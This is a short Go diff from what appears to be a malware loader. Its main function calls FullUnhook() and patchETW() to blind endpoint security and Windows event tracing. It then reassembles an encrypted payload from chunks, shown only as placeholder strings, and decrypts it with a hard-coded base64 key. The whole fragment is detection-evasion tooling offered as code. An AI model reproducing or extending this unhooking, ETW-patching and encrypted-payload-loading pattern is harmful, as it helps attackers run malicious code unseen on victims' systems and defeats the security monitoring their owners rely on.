@@ -360,16 +360,16 @@ func main() {
 		FullUnhook()
 	}
 	patchETW()
-
+	
 	var ciphertext string
-		ciphertext = ciphertext + "Base64String1"
-		ciphertext = ciphertext + "Base64String2"
-		ciphertext = ciphertext + "Base64String3"
-		ciphertext = ciphertext + "Base64String4"
-		ciphertext = ciphertext + "Base64String5"
-		ciphertext = ciphertext + "Base64String6"
-		ciphertext = ciphertext + "Base64String7"
-		ciphertext = ciphertext + "Base64String8"
+	ciphertext = ciphertext + "AESString1"
+	ciphertext = ciphertext + "AESString2"
+	ciphertext = ciphertext + "AESString3"
+	ciphertext = ciphertext + "AESString4"
+	ciphertext = ciphertext + "AESString5"
+	ciphertext = ciphertext + "AESString6"
+	ciphertext = ciphertext + "AESString7"
+	ciphertext = ciphertext + "AESString8"
 
 	vciphertext, _ := base64.StdEncoding.DecodeString(ciphertext)
 	vkey, _ := base64.StdEncoding.DecodeString("YGCjSIR7GeeCHP6f0oojty+LQHhq9Q/T+kFsYu5cQis=")
